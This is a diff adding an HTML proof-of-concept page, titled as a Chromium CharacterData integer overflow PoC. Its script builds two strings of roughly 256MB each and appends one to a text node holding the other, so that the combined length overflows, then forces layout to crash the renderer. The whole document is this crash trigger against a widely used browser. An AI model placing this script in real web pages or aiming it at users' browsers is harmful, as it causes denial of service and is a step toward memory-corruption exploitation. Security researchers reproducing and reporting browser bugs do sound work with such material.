@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Chromium CharacterData Integer Overflow PoC</title>
+</head>
+<body>
+<script>
+function buildLargeString(targetSize) {
+  const chunk = "A".repeat(1024 * 1024); // 1MB chunks
+  let s = "";
+  while (s.length + chunk.length < targetSize)
+    s += chunk;
+  s += "A".repeat(targetSize - s.length); // Final pad
+  return s;
+}
+
+function crash() {
+  try {
+    const initialSize  = 0x0FFFFFF0;  // 268,435,424 bytes (~256MB - 16)
+    const appendSize   = 0x10000000;  // 268,435,456 bytes (exactly 256MB)
+
+    const bigString    = buildLargeString(initialSize);
+    const extraString  = buildLargeString(appendSize);
+
+    const textNode = document.createTextNode(bigString);
+    textNode.appendData(extraString);
+
+    document.body.appendChild(textNode);
+    console.log(document.body.offsetHeight); // Force layout
+  } catch (e) {
+    console.error("Caught JS exception:", e);
+  }
+}
+
+crash();
+</script>
+</body>
+</html>
